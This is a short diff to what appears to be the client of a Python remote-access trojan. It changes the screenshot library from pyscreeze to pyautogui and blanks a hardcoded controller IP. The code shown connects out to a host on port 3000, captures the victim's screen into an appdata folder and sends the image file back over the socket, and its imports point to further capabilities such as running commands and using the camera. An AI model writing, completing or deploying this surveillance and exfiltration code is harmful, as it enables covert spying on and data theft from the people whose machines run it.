@@ -1,8 +1,8 @@
-import socket, subprocess, os, time, platform, sys, pyscreeze, urllib.request, cv2, shutil
+import socket, subprocess, os, time, platform, sys, pyautogui, urllib.request, cv2, shutil
 from io import StringIO
 
 # Socket Properties
-HOST = "192.168.0.164"
+HOST = ""
 PORT = 3000
 
 # Defines (Send & Recv) Functions for use
@@ -89,7 +89,7 @@ def OpenWebpage(url):
 
 def Screenshot():
     try:
-        pyscreeze.screenshot(appdata+"/screenshot.png"); send(b"success"); time.sleep(0.2); send(str(os.path.getsize(appdata+"/screenshot.png")).encode())
+        pyautogui.screenshot(appdata+"/screenshot.png"); send(b"success"); time.sleep(0.2); send(str(os.path.getsize(appdata+"/screenshot.png")).encode()); time.sleep(0.2)
         with open(appdata+"/screenshot.png", "rb") as ImageFile:
             send(ImageFile.read())
     except:
